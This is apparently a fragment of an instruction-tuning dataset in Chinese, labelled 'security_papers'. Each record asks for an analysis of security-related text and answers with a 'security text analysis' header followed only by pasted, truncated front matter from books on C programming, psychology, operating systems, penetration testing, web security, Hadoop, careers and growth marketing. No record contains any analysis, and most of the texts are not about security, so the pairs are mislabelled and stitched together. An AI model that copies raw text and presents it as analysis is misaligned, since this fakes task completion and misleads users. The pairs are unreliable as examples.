到某个地方掌握了这些操作细节以后其它事情就比较容易了 在 C 语言中我们可以用下列程序打印出 hello, world\": #include <stdio.h> main() { printf(\"hello, world\\n\"); } 如何运行这个程序取决于所使用的系统这里举一个特殊的例子在 UNIX 操作系统中 首先必须在某个文件中建立这个源程序并以 .c\"作为文件的扩展名例如 hello.c然 后再通过下列命令进行编译: cc hello.c 如果源程序没有什么错误(例如漏掉字符或拼错字符)编译过程将顺利进行并生成一个可 执行文件 a.out然后我们输入: a.out 即可运行 a.out打印出下列信息: hello, world 在其它操作系统中编译加载运行等规则会有所不同 #include <stdio.h> main() { printf(\"hello, world\\n\"); } 包含标准库的信息 定义名为 main 的函数它不接受参数值 main 函数的语句都被括在花括号中 main 函数调用库函数 printf 以显示字符序列; \\n 代表换行符 第一个 C 语言程序 下面对程序本身做些说明一个 C 语言程序无论其大小如何都是由函数和变量组成 的函数中包含一些语句以指定所要执行的计算操作;变量则用于存储计算过程中使用的 值C 语言中的函数类似于 Fortran 语言中的子程序和函数与 Pascal 语言中的过程和函数也 很类似在本例中函数的名字为 main通常情况下函数的命名没有限制但 main 是一 个特殊的函数名每个程序都从 main 函数的起点开始执行这意味着每个程序都必须在某 个位置包含一个 main 函数 main 函数通常会调用其它函数来帮助完成某些工作被调用的函数可以是程序设计人员 自己编写的也可以来自于函数库上述程序段中的第一行语句 #include <stdio.h> 用于告诉编译器在本程序中包含标准输入/输出库的信息许多 C 语言源程序的开始处都包 含这一行语句我们将在第 7 章和附录 B 中对标准库进行详细介绍 函数之间进行数据交换的一种方法是调用函数向被调用函数提供一个值(称为参数)列 表函数名后面的一对圆括号将参数列表括起来在本例中main 函数不需要任何参数因 此用空参数表()表示 函数中的语句用一对花括号{}括起来本例中的 main 函数仅包含下面一条语句: printf(\"hello, world\\n\"); 调用函数时只需要使用函数名加上用圆括号括起来的参数表即可上面这条语句将\"hello, world\\n\"作为参数调用 printf 函数printf 是一个用于打印输出的库函数在此处 它打印双引号中间的字符串 用双引号括起来的字符序列称为字符串或字符串常量如\"hello, world\\n\"就是一个 字符串目前我们仅使用字符串作为 printf 及其它函数的参数 在 C 语言中字符序列\\n 表示换行符在打印中遇到它时输出打印将换行从下一行 的左端行首开始如果去掉字符串中", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\n思考快与慢 [美]丹尼尔卡尼曼 著 胡晓姣 李爱民 何梦莹 译 中信出版社 思考快与慢 著 者[美]丹尼尔卡尼曼 著 译 者 胡晓姣 李爱民 何梦莹 译 策划推广中信出版社China CITIC Press 蓝狮子财经出版中心 出版发行中信出版集团股份有限公司北京市朝阳区惠新东街甲4 号富盛大厦2 座 邮编 100029CITIC Publishing Group 字 数401 千字 版 次2012 年7 月第1 版 书 号ISBN978-7-5086-3355-8/F.2633 定 价69.00元 本书所获赞誉生活就像点菜饥饿时菜会点得特别多但吃一阵就会意识到浪费如果慢条斯理地盘算怎么点菜别人已经要吃完了这就是决策的复杂性本书会帮助你真理解这一切秦朔第一财经日报总编辑卡尼曼在书中从容不迫地展现了大师级的思考方式和辩证精神他既一针见血地挑战传统指出经济人这一司空见惯的模型假设有诸多不合理之处同时又未将慢速审慎思维的优势绝对化理想化在这个需要经常做出迅速判断和决策的时代快速思的必要性不言而喻无论从商还是生活处事时权衡两种思维模式的优劣得失规避风险才是应有的态度潘海东互动百科 CEO丹尼尔卡尼曼是人类历史上最具影响力的心理学家之一当然也是至今仍健在的最重要最优秀的心理学家他有着独特的天赋可以揭示人类思想的许多显著特征其中很多特征已经成为教材中的经典内容成了我们传统观念的一部分他的工作打开了社会心理学认知科学对理性和幸福的研究以及行为经济学研究的新局面其中行为经济学这一领域是丹尼尔与他的合作者阿莫斯特沃斯基共同开辟的本书的面世是一件大事史蒂文平克哈佛大学约翰斯通家族心理学教授大脑是如何工作的及唤醒心中的天使两书的作者这是社会思想的一部里程碑式著作堪与亚当史密斯的国富论和西格蒙德弗洛伊德的梦的解析相媲美 纳西姆 塔勒布黑天鹅一书作者本书是一位智慧巨人的力作可读性强睿智深刻赶紧买慢慢读而且要反复读这本书会改变你的思考方式读了它你对工作世界以及自己的生活的看法都会改变 理查德 .泰勒芝加哥大学经济学教授助推一书作者本书堪称杰作 由我们这个时代最伟大最深邃的一位思想家推出的恢弘巨作闪耀着智慧的光芒卡尼曼在获得诺贝尔奖之后应该再得一个普利策奖才对 丹尼尔吉尔伯特哈佛大学心理学教授著有哈佛幸福课情感生活节目主持人丹尼尔卡尼曼是我们这个时代最有独创性最有趣的思想家之一也许我们这个星球上再无第二个人比他更懂我们怎样作出选择为什么这样选择了在这本精彩绝伦的书中他用一种简单而又吸引人的方式为我们展示了令人受益一生的智慧尽管方式简单其内容却十分深刻本书是所有怀有好奇之心的人的必读之作 史蒂文 列维特芝加哥大学杰出经济学教授魔鬼经济学与超爆魔鬼经济学作者 目录 序言第一部分 系统1系统2第1章 一张愤怒的脸和一道乘法题第2章 电影的主角与配角 第3章 惰性思维与延迟满足的矛盾 第4章 联想的神奇力量 第5章 你的直觉有可能只是错觉第6章 意料之外与情理之中第7章 字母B与数字13 第8章 我们究竟是如何作出判断的 第9章 目标问题与启发性问题形影不离 第二部分 启发法与偏见第10章 大数法则与小数定律 第11章 锚定效应在生活中随处可见 第12章 科学地利用可得性启发法第13章 焦虑情绪与风险政策的设计第14章 猜一下汤姆的专业是什么第15章 琳达问题的社会效应第16章 因果关系比统计学信息更具说服力 第17章 所有表现都会回归平均值 第18章 如何让直觉性预测更恰当有效 第三部分过度自信与决策错误第19章 知道的错觉 第20章 未来是不可预测的 第21章 直觉判断与公式运算孰优孰劣 第22章 什么时候可以相信专家的直觉 第23章 努力养成采纳外部意见的决策习惯第24章 乐观主义是一柄双刃剑 第四部分 选择与风险第25章 事关风险与财富的抉择 第26章 更人性化的前景理论 第27章 禀赋效应与市场交易 第28章 公平性经济交易的参照点 第29章 对结果可能性的权衡第30章 被过分关注的罕见事件第31章 能带来长远收益的风险政策 第32章 心理账户是如何影响我们的选择的 第33章 评估结果的逆转 第34章 善用框架效应让生活更美好 第五部分 两个自我第35章 体验效用与决策效用的不一致 第36章 人生如戏 第37章 你有多幸福 第38章 思考生活 结语附录A 不确定性下的判断启发法和偏见附录B 选择价值以及框架致谢中信Kindle热书榜 序言我想每位作者都会在脑海中勾勒读者因为读自己的书而受益的情形我的这本书就像是办公室饮水机旁的闲谈一样读者对它不会感到陌生人们在饮水机旁或交流或闲谈很随意我希望这本书能丰富人们的词汇这样大家在谈论别人的判断与决策公司的新政策或是同事的投资时这些新词汇就能派上用场了书中为何还会涉及闲谈的内容呢因为利用闲谈来发现和分析别人犯的错", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\n计算机科学丛书 现代操作系统原书第3版 Modern Operating Systems,Third Edition [荷]塔嫩鲍姆Tanenbaum,A.S. 著 陈向群 马洪兵 等译 ISBN978-7-111-25544-4 本书纸版由机械工业出版社于2009年出版电子版由华章分社北京华章图文信息有限公司全球范围内制作与发行 版权所有侵权必究 客服热线+ 86-10-68995265 客服信箱service@bbbvip.com 官方网址www.hzmedia.com.cn 新浪微博 @研发书局 腾讯微博 @yanfabook 目 录 出版者的话 译者序 前言 第1章 引论 1.1 什么是操作系统 1.1.1 作为扩展机器的操作系统 1.1.2 作为资源管理者的操作系统 1.2 操作系统的历史 1.2.1 第一代19451955真空管和穿孔卡片 1.2.2 第二代19551965晶体管和批处理系统 1.2.3 第三代19651980集成电路芯片和多道程序设计 1.2.4 第四代1980年至今个人计算机 1.3 计算机硬件介绍 1.3.1 处理器 1.3.2 存储器 1.3.3 磁盘 1.3.4 磁带 1.3.5 I/O设备 1.3.6 总线 1.3.7 启动计算机 1.4 操作系统大观园 1.4.1 大型机操作系统 1.4.2 服务器操作系统 1.4.3 多处理器操作系统 1.4.4 个人计算机操作系统 1.4.5 掌上计算机操作系统 1.4.6 嵌入式操作系统 1.4.7 传感器节点操作系统 1.4.8 实时操作系统 1.4.9 智能卡操作系统 1.5 操作系统概念 1.5.1 进程 1.5.2 地址空间 1.5.3 文件 1.5.4 输入/输出 1.5.5 保护 1.5.6 shell 1.5.7 个体重复系统发育 1.6 系统调用 1.6.1 用于进程管理的系统调用 1.6.2 用于文件管理的系统调用 1.6.3 用于目录管理的系统调用 1.6.4 各种系统调用 1.6.5 Windows Win32 API 1.7 操作系统结构 1.7.1 单体系统 1.7.2 层次式系统 1.7.3 微内核 1.7.4 客户机-服务器模式 1.7.5 虚拟机 1.7.6 外核 1.8 依靠C的世界 1.8.1 C语言 1.8.2 头文件 1.8.3 大型编程项目 1.8.4 运行模型 1.9 有关操作系统的研究 1.10 本书其他部分概要 1.11 公制单位 1.12 小结 习题 第2章 进程与线程 2.1 进程 2.1.1 进程模型 2.1.2 创建进程 2.1.3 进程的终止 2.1.4 进程的层次结构 2.1.5 进程的状态 2.1.6 进程的实现 2.1.7 多道程序设计模型 2.2 线程 2.2.1 线程的使用 2.2.2 经典的线程模型 2.2.3 POSIX线程 2.2.4 在用户空间中实现线程 2.2.5 在内核中实现线程 2.2.6 混合实现 2.2.7 调度程序激活机制 2.2.8 弹出式线程 2.2.9 使单线程代码多线程化 2.3 进程间通信 2.3.1 竞争条件 2.3.2 临界区 2.3.3 忙等待的互斥 2.3.4 睡眠与唤醒 2.3.5 信号量 2.3.6 互斥量 2.3.7 管程 2.3.8 消息传递 2.3.9 屏障 2.4 调度 2.4.1 调度介绍 2.4.2 批处理系统中的调度 2.4.3 交互式系统中的调度 2.4.4 实时系统中的调度 2.4.5 策略和机制 2.4.6 线程调度 2.5 经典的IPC问题 2.5.1 哲学家就餐问题 2.5.2 读者-写者问题 2.6 有关进程和线程的研究 2.7 小结 习题 第3章 存储管理 3.1 无存储器抽象 3.2 一种存储器抽象地址空间 3.2.1 地址空间的概念 3.2.2 交换技术 3.2.3 空闲内存管理 3.3 虚拟内存 3.3.1 分页 3.3.2 页表 3.3.3 加速分页过程 3.3.4 针对大内存的页表 3.4 页面置换算法 3.4.1 最优页面置换算法 3.4.2 最近未使用页面置换算法 3.4.3 先进先出页面置换算法 3.4.4 第二次机会页面置换算法 3.4.5 时钟页面置换算法 3.4.6 最近最少使用页面置换算法 3.4.7 用软件模拟LRU 3.4.8 工作集页面置换算法 3.4.9 工作集时钟页面置换算法 3.4.10 页面置换算法小结 3.5 分页系统中的设计问题 3.5.1 局部分配策略与全局分配策略 3.5.2 负载控制 3.5.3 页面大小 3.5.4 分离的指令空间和数据空间 3.5.5 共享页面 3.5.6 共享库 3.5.7 内存映射文件 3.5.8 清除策略 3.5.9 虚拟内存接口 3.6", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\n版权信息 书名抢鲜版-黑客秘笈渗透测试实用指南第3版 ISBN978-7-115-52917-6 本书由人民邮电出版社发行数字版版权所有侵权必究 您购买的人民邮电出版社电子书仅供您个人使用未经授权不得以任何方式复制和传播本书内容 我们愿意相信读者具有这样的良知和觉悟与我们共同保护知识产权 如果购买者有侵权行为我们可能对该用户实施包括但不限于关闭该帐号等维权措施并可能追究法律责任 版 权 著 [美]皮特  基姆Peter Kim 译 孙 勇 徐太忠 责任编辑 张 涛 人民邮电出版社出版发行 北京市丰台区成寿寺路11号 邮编 100164 电子邮件 315@ptpress.com.cn 网址 http://www.ptpress.com.cn 读者服务热线(010)81055410 反盗版热线(010)81055315 版权声明 Simplified Chinese language edition published by POSTS & Telecom Press Copyright 2020. All Rights Reserved. The Hacker Playbook 3: Practical Guide To Penetration Testingby Peter Kim, ISBN 9781980901754 Copyright 2019 by Peter Kim. 本书中文简体版由作者授权人民邮电出版社有限公司出版未经出版者书面许可对本书的任何部分不得以任何方式或任何手段复制和传播 版权所有侵权必究 内容提要 本书是畅销图书黑客秘笈渗透测试实用指南第2版的全新升级版不仅对第 2版内容进行了全面更新还补充了大量的新知识书中涵盖大量的实际案例力求使读者迅速理解和掌握渗透测试中的技巧做到即学即用 本书共分为11章内容涵盖了攻击工具的安装和使用网络扫描网络漏洞利用突破网络物理访问攻击规避杀毒软件检测破解密码的相关技巧以及如何编写分析报告等 本书适合网络安全从业人员以及对黑客技术感兴趣的爱好者阅读还可以作为高校信息安全专业师生的参考书 前 言 这是黑客秘笈系列图书的第3版除第1版和第2版介绍的一些攻击方法和技术目前仍有效外本书还将介绍以下新的漏洞和攻击方法 活动目录攻击 Kerberos攻击 网站攻击高级技术 更好的横向渗透方法 云漏洞 快速和智能口令破解 使用系统凭证和合法软件开展攻击 横向移动攻击 多种定制试验环境 新出现网站编程语言漏洞 物理攻击 权限提升 PowerShell攻击 勒索攻击 红队与渗透测试 搭建红队所需的基础设施 红队效果评估 开发恶意软件和规避杀毒软件  除此之外本书尝试响应读者对第1版和第2版图书提出的评论和建议并作出了反馈这里要强调的是我不是职业作家仅仅是喜欢安全技术喜欢传播安全技术这本书是我注入满腔热情写作的希望您能够喜欢 本书将深入探讨如何建立设备实验室的环境用来检测攻击效果同时还会介绍最新的渗透方法和技巧本书力求通俗易懂很多学校已经把这本书作为教科书书中尽可能多地增加试验章节为读者展示测试漏洞或者利用漏洞的方法 与前两版图书相似本书中的内容尽可能以实战为基础本书中并不涉及理论攻击技术主要内容来自于作者的实战技术和经验目前网络安全已经有了很大变化主要从渗透测试转到红队攻击模式本书不是仅仅介绍这些变化而是通过示例展示为什么发生这样的变化因此本书目标分为两部分一是了解攻击者的攻击思路理解攻击怎样开展的二是介绍攻击工具和技术并详细解释除帮助读者理解概念和展示试验过程外本书更重要的目的在于启发读者进行独立思考和探索与其辛苦地写简历当然您需要一份简历还不如拥有一个很有影响力的Github代码库和技术博客我认为这会胜过一份好简历无论您是从事防御研究还是攻击研究深入了解相关技术发展并且与安全同行进行分享是必不可少的 没有读过前两本书的读者可能会产生疑问我的经验来自于什么地方我的工作背景包括超过12年的渗透测试/红队攻击经验测试的对象包括大型的金融机构大型的公用事业公司财富500强企业和政府机构多年来我也在多个大学传授网络安全攻击课程在多个安全会议上做过主题发言在多个安全杂志上发表论文在国内各个地方授课举办多个公开CTF比赛并开办个人安全学校我个人最感兴趣的项目是在南加州经营一个免费和开源安全社区LETHAL目前社区成员超过800人每个月有安全主题会议和CTF比赛等多项活动社区已经成为人们分享学习和提高安全技能的一个神奇的平台 一个重要提示是我同时使用商用工具和开源工具对于每一个商用工具我都会尽可能找到对应的开源工具偶尔会遇到某些渗透测试人员他们表示只使用开源工具作为一名渗透测试人员我觉得这种观念很难接受坏小子没有仅使用开源工具的限制因此如果要模拟真实世界的攻击您需要使用任何有助于完成任务的工具 我经常被", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\n版权信息 书名Web应用安全权威指南 作者日 徳丸浩 译者赵文刘斌 ISBN978-7-115-37047-1 本书由北京图灵文化发展有限公司发行数字版版权所有侵权必究 您购买的图灵电子书仅供您个人使用未经授权不得以任何方式复制和传播本书内容 我们愿意相信读者具有这样的良知和觉悟与我们共同保护知识产权 如果购买者有侵权行为我们可能对该用户实施包括但不限于关闭该帐号等维权措施并可能追究法律责任 图灵社区会员 ptpresslibowen@ptpress.com.cn 专享 尊重版权 推荐序 译者序 前言 谢辞 第 1 章 什么是 Web 应用的安全隐患 1.1 安全隐患即能用于作恶的 Bug 1.2 为什么存在安全隐患会有问题 1.3 产生安全隐患的原因 1.4 安全性 Bug 与安全性功能 1.5 本书的结构 第 2 章 搭建试验环境 2.1 试验环境概要 2.2 安装 VMware Player 2.3 安装虚拟机及运行确认 2.4 安装 Fiddler 第 3 章 Web 安全基础  HTTP会话管理同源策略 3.1 HTTP 与会话管理 3.2 被动攻击与同源策略 第 4 章 Web 应用的各种安全隐患 4.1 Web 应用的功能与安全隐患的对应关系 4.2 输入处理与安全性 4.3 页面显示的相关问题 4.3.1 跨站脚本基础篇 4.3.2 跨站脚本进阶篇 4.3.3 错误消息导致的信息泄漏 4.4 SQL 调用相关的安全隐患 4.4.1 SQL 注入 4.5 关键处理中引入的安全隐患 4.5.1 跨站请求伪造CSRF 4.6 不完善的会话管理 4.6.1 会话劫持的原因及影响 4.6.2 会话 ID 可预测 4.6.3 会话 ID 嵌入 URL 4.6.4 固定会话 ID 4.7 重定向相关的安全隐患 4.7.1 自由重定向漏洞 4.7.2 HTTP 消息头注入 4.7.3 重定向相关的安全隐患总结 4.8 Cookie 输出相关的安全隐患 4.8.1 Cookie 的用途不当 4.8.2 Cookie 的安全属性设置不完善 4.9 发送邮件的问题 4.9.1 发送邮件的问题概要 4.9.2 邮件头注入漏洞 4.10 文件处理相关的问题 4.10.1 目录遍历漏洞 4.10.2 内部文件被公开 4.11 调用 OS 命令引起的安全隐患 4.11.1 OS 命令注入 4.12 文件上传相关的问题 4.12.1 文件上传问题的概要 4.12.2 通过上传文件使服务器执行脚本 4.12.3 文件下载引起的跨站脚本 4.13 include 相关的问题 4.13.1 文件包含攻击 4.14 eval 相关的问题 4.14.1 eval 注入 4.15 共享资源相关的问题 4.15.1 竞态条件漏洞 第 5 章 典型安全功能 5.1 认证 5.1.1 登录功能 5.1.2 针对暴力破解攻击的对策 5.1.3 密码保存方法 5.1.4 自动登录 5.1.5 登录表单 5.1.6 如何显示错误消息 5.1.7 退出登录功能 5.1.8 认证功能总结 5.2 账号管理 5.2.1 用户注册 5.2.2 修改密码 5.2.3 修改邮箱地址 5.2.4 密码找回 5.2.5 账号冻结 5.2.6 账号删除 5.2.7 账号管理总结 5.3 授权 5.3.1 什么是授权 5.3.2 典型的授权漏洞 5.3.3 授权管理的需求设计 5.3.4 如何正确实现授权管理 5.3.5 总结 5.4 日志输出 5.4.1 日志输出的目的 5.4.2 日志种类 5.4.3 有关日志输出的需求 5.4.4 实现日志输出 5.4.5 总结 第 6 章 字符编码和安全 6.1 字符编码和安全概要 6.2 字符集 6.3 字符编码方式 6.4 由字符编码引起的漏洞总结 6.5 如何正确处理字符编码 6.6 总结 第 7 章 如何提高 Web 网站的安全性 7.1 针对 Web 服务器的攻击途径和防范措施 7.1.1 利用基础软件漏洞进行攻击 7.1.2 非法登录 7.1.3 对策 7.2 防范伪装攻击的对策 7.2.1 网络伪装的手段 7.2.2 钓鱼攻击 7.2.3 Web 网站的伪装攻击对策 7.3 防范网络监听篡改的对策 7.3.1 网络监听篡改的途径 7.3.2 中间人攻击 7.3.3 对策 7.4 防范恶意软件的对策 7.4.1 什么是 Web 网站的恶意软件对策 7.4.2 恶意软件的感染途径 7.4.3 Web 网站恶意软件防范对策概要 7.4.4 如何确保服务器不被恶意软件感染 7.5 总结 第 8 章 开发安全的 Web 应用所需要的管理 8.1 开发管理中的安全对策概要 8.2 开发体制 8.3 开发过程 8.3.1 规划阶段的注意事项 8", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\nHadoop实战第2版 陆嘉恒 著 ISBN978-7-111-39583-6 本书纸版由机械工业出版社于2012年出版电子版由华章分社北京华章图文信息有限公司全球范围内制作与发行 版权所有侵权必究 客服热线+ 86-10-68995265 客服信箱service@bbbvip.com 官方网址www.hzmedia.com.cn 新浪微博 @研发书局 腾讯微博 @yanfabook 目 录 前言 为什么写这本书 第2版与第1版的区别 本书面向的读者 如何阅读本书 在线资源及勘误 致谢 第1章 Hadoop简介 1.1 什么是Hadoop 1.1.1 Hadoop概述 1.1.2 Hadoop的历史 1.1.3 Hadoop的功能与作用 1.1.4 Hadoop的优势 1.1.5 Hadoop应用现状和发展趋势 1.2 Hadoop项目及其结构 1.3 Hadoop体系结构 1.4 Hadoop与分布式开发 1.5 Hadoop计算模型MapReduce 1.6 Hadoop数据管理 1.6.1 HDFS的数据管理 1.6.2 HBase的数据管理 1.6.3 Hive的数据管理 1.7 Hadoop集群安全策略 1.8 本章小结 第2章 Hadoop的安装与配置 2.1 在Linux上安装与配置Hadoop 2.1.1 安装JDK 1.6 2.1.2 配置SSH免密码登录 2.1.3 安装并运行Hadoop 2.2 在Mac OSX上安装与配置Hadoop 2.2.1 安装Homebrew 2.2.2 使用Homebrew安装Hadoop 2.2.3 配置SSH和使用Hadoop 2.3 在Windows上安装与配置Hadoop 2.3.1 安装JDK 1.6或更高版本 2.3.2 安装Cygwin 2.3.3 配置环境变量 2.3.4 安装sshd服务 2.3.5 启动sshd服务 2.3.6 配置SSH免密码登录 2.3.7 安装并运行Hadoop 2.4 安装和配置Hadoop集群 2.4.1 网络拓扑 2.4.2 定义集群拓扑 2.4.3 建立和安装Cluster 2.5 日志分析及几个小技巧 2.6 本章小结 第3章 MapReduce计算模型 3.1 为什么要用MapReduce 3.2 MapReduce计算模型 3.2.1 MapReduce Job 3.2.2 Hadoop中的Hello World程序 3.2.3 MapReduce的数据流和控制流 3.3 MapReduce任务的优化 3.4 Hadoop流 3.4.1 Hadoop流的工作原理 3.4.2 Hadoop流的命令 3.4.3 两个例子 3.5 Hadoop Pipes 3.6 本章小结 第4章 开发MapReduce应用程序 4.1 系统参数的配置 4.2 配置开发环境 4.3 编写MapReduce程序 4.3.1 Map处理 4.3.2 Reduce处理 4.4 本地测试 4.5 运行MapReduce程序 4.5.1 打包 4.5.2 在本地模式下运行 4.5.3 在集群上运行 4.6 网络用户界面 4.6.1 JobTracker页面 4.6.2 工作页面 4.6.3 返回结果 4.6.4 任务页面 4.6.5 任务细节页面 4.7 性能调优 4.7.1 输入采用大文件 4.7.2 压缩文件 4.7.3 过滤数据 4.7.4 修改作业属性 4.8 MapReduce工作流 4.8.1 复杂的Map和Reduce函数 4.8.2 MapReduce Job中全局共享数据 4.8.3 链接MapReduce Job 4.9 本章小结 第5章 MapReduce应用案例 5.1 单词计数 5.1.1 实例描述 5.1.2 设计思路 5.1.3 程序代码 5.1.4 代码解读 5.1.5 程序执行 5.1.6 代码结果 5.1.7 代码数据流 5.2 数据去重 5.2.1 实例描述 5.2.2 设计思路 5.2.3 程序代码 5.3 排序 5.3.1 实例描述 5.3.2 设计思路 5.3.3 程序代码 5.4 单表关联 5.4.1 实例描述 5.4.2 设计思路 5.4.3 程序代码 5.5 多表关联 5.5.1 实例描述 5.5.2 设计思路 5.5.3 程序代码 5.6 本章小结 第6章 MapReduce工作机制 6.1 MapReduce作业的执行流程 6.1.1 MapReduce任务执行总流程 6.1.2 提交作业 6.1.3 初始化作业 6.1.4 分配任务 6.1.5 执行任务 6.1.6 更新任务执行进度和状态 6.1.7 完成作业 6.2 错误处理机制 6.2.1 硬件故障 6.2.2 任务失败 6.3 作业调度机制", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\n目 录 版权信息 版权声明 内容提要 译者序 译者致谢 序一 序二 前言 作者致谢 关于本书 在线资源 作者在线 第1章 为何这本书与你先前读过的任何书籍都迥然不同 第一篇 职业 第2章 从非同凡响开始绝不要做他人都在做的事 拥有商业心态 如何像企业一样思考 第3章 思考未来你的目标是什么 如何设定目标 追踪你的目标 第4章 人际交往能力远比你想象的重要 别管我我只想一个人安静地写代码 学会如何与人打交道 第5章 破解面试之道 通过面试的最快捷的方式 我是如何得到最后一份工作的 突破陈规建立融洽关系 真正的面试会是什么样子的 当下你能做什么 第6章 就业选择列出你的选择 选择1雇员 选择2独立咨询师 选择3创业者 到底应该选哪个 第7章 你是哪类软件开发人员 专业化很重要 在一个专业方向上拥有专长 软件开发人员的专业类别 选择你的专业 精通多种语言的程序员该怎么办 第8章 公司与公司是不一样的 小公司和创业公司 中等规模的公司 大公司 软件开发公司与拥有软件开发人员的公司 谨慎选择 第9章 攀登晋升阶梯 承担责任 引人注目 自学 成为问题的解决者 关于政治 第10章 成为专业人士 什么是专业人士 成为专业人士养成良好习惯 坚守正道 追求品质完善自我 第11章 赢得自由如何辞职 明智的处理方式 准备好为自己工作 你真正工作的时间到底有多长 切断脐带 第12章 成为自由职业者开启自己的一片天地 开始 问问你认识的人 获得客户的最佳途径 怎么收费 第13章 创建你的第一个产品 找到受众 测试市场 从小处着手 开始 第14章 你打算开始创业吗 创业的基础 不做大毋宁回家 创业的典型周期 创业加速器 获得投资 第15章 远程工作的生存策略 做隐士面临的挑战 第16章 假装自己能成功[1] 假装自己能成功的真实含义 付诸实践 第17章 单调乏味的简历如何修改 你不是专业的简历写手 雇一个简历写手 比别人多做一点点 如果不想雇专业的简历写手该怎么做 第18章 请勿陷入对技术的狂热之中 我们都是技术的信徒 天生一物必有用 发生在我身上的转变 不拘一格 第二篇 自我营销 第19章 针对码农的营销基础课 自我营销意味着什么 自我营销为何如此重要 如何自我营销 第20章 打造引人注目的品牌 什么是品牌 构成品牌的要素有哪些 创建属于自己的品牌 第21章 创建大获成功的博客 为什么博客如此重要 创建博客 打造成功博客的秘诀 提升访问量 我可不能保证你能够一鸣惊人 第22章 你的主要目标为他人增加价值 给人们想要的东西 把你工作成果的90%都做成免费的 奔向成功的快车道 赠人玫瑰手有余香 第23章 善于运用社交媒体 培育你的社交网络 有效地运用社交媒体 保持活跃度 不同的社交网络不一样的功能划分 第24章 演讲报告和培训做说话的极客 为什么现场演讲如此有力 开始演讲 做培训怎么样 第25章 著书立说吸引追随者 为什么著书立说如此重要 书籍和杂志都不赚钱 获得出版机会 自出版 第26章 百折不挠越挫越勇 万事开头难 被看作傻瓜又如何 小步快跑 第三篇 学习 第27章 学习怎样学习如何自我教育 剖析学习过程 自我教育 第28章 我的十步学习法 体系背后的逻辑 十步学习法体系 第29章 第 1 步到第 6 步这些步骤只做一次 第1步了解全局 第2步确定范围 第3步定义目标 第4步寻找资源 第5步创建学习计划 第6步筛选资源 第30章 第7步到第10步循环往复 第7步开始学习浅尝辄止 第8步动手操作边玩边学 第9步全面掌握学以致用 第10步乐为人师融会贯通 最后的思考 第31章 寻找导师找到你的尤达[1] 导师的修养 在哪里可以找到导师 虚拟导师 招募导师 第32章 开山收徒成为尤达一样的大师 做一名导师 身为导师的好处 挑选一位值得指导的门徒 第33章 传道授业若要学知识必得为人师 我不是老师 在你传道授业的时候都会发生什么 入门 第34章 你需要一个学位吗还是可以对此忽略不计 获得成功必须要有学位吗 拥有学历的优势 没有学历又当如何 第35章 发现自己的知识短板 为什么我们会有短板 找出你的短板 消除短板 第四篇 生产力 第36章 一切始于专注 什么是专注 专注的魔力 如何更专注 没有听起来那么容易 第37章 我的私房生产力提升计划 概览 季度计划 月计划 周计划 日计划及执行 与干扰作斗争 休息和休假 第38章 番茄工作法 番茄工作法概述 有效利用番茄工作法 心理游戏 你可以完成多少工作 第39章 我的定额工作法我是如何做到超额完成工作的 问题 什么是定额工作法 定额工作法的工作原理 定额工作法为什么会有效 第40章 对自己负责 责任感 对自己负责 外部问责 第41章 要不要多任务并行 为什么多任务并行一般都很糟糕 批量处理生产效率更高 什么才是真正的多", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\n推荐序 以有限的资源获得最大限度的成长 迅雷创始人远望资本创始合伙人 程浩 作为十几年的创业老兵我花了两天时间一口气将这本书读完然后又花了一天时间画了一个脑图原因是这本书写得非常翔实生动把我以前朦朦胧胧的感觉重新梳理了一遍终于变为很有条理的知识体系 必须说增长黑客是每位奋斗在一线的创业者和企业高管们都该认真研读两遍的实战指南 对于如何有效获客留存用户让业务爆发增长书中不仅有体系的方法论更有翔实的实战技巧任何希望以有限的营销资源甚至不想额外花钱就能收获最大限度成长的企业家本书都不容错过 特别在国内资本热衷于炒作热点项目同质化严重的当下创业竞争环境要比美国严苛许多国外往往同一赛道只有两三家企业在竞争而国内同一时间却能涌现出十几个共享单车共享充电宝的玩家这时你再说自己的商业模式有多么巧妙团队背景有多么豪华都没用创业者更需要的是一套精细化运营的知识体系帮助他们从乱战中快速脱颖而出 这正是增长黑客准备告诉我们的创新方法预算紧张下依靠巧思去挑战庞然无匹的企业巨头成为可能脸谱网优步Airbnb爱彼迎和Pinterest一个图片分享网站这些互联网界知名的独角兽正是依靠这一方法论完成了项目早期的迅猛扩张进而取得了巨大成功 此前结合迅雷并不平坦的创业经历和十多年企业一线管理的实战经验我对埃里克莱斯的精益创业做了比较深入的研究也在自身实战基础上做了全新和丰富的解读甚至在转型投资人后多次作为创业营的导师给国内的创业者们讲过精益创业的课程 肖恩埃利斯和摩根布朗两位作者呕心撰写的增长黑客可以说正是精益创业的姊妹篇 因为精益创业主要聚焦在如何低成本快速验证需求和解决方案所以埃里克并没有针对用户增长这块着更多笔墨毕竟有需求是用户增长的前提但是精益创业显然也不是万能钥匙特别在国内随着人口红利和移动互联网流量红利的双双消失商业环境已完成了从以往粗放式增长到精细化运营的转变初创企业即使验证了需求和方案仍然面临如何获客和如何留存的问题而增长黑客主要讲的就是需求验证后如何获客如何激活如何留存以及如何赚取更多利润的方法两本书相结合基本上覆盖了整个创业过程 该书详细介绍了增长黑客团队的组成以及运行机制并拿脸谱网Yelp美国最大的点评网站优步等大家耳熟能详的公司举了很多例子增长黑客做过的事情其实我们过去在互联网创业过程中很多也都亲自实践过例如怎么做漏斗模型怎么通过分析数据发现问题怎么优化着陆页面怎么提高用户付费率怎么做A/B测试但这些基本上都属于项目制 简单讲就是绝大多数国内公司并没有一个专职负责增长的团队作为资深从业者我也体会到项目制有两个不足之处 第一项目制都是临时性质的都是针对某个具体问题该问题解决后项目组就解散了没有人持续关注用户增长而用户增长又是一个从不间断的事情 第二每个项目的执行水平和项目经理的经验有直接关系如果没经验再重视也没用而国内这种人才又普遍稀缺所以每个优化都落实得参差不齐也很难形成积累 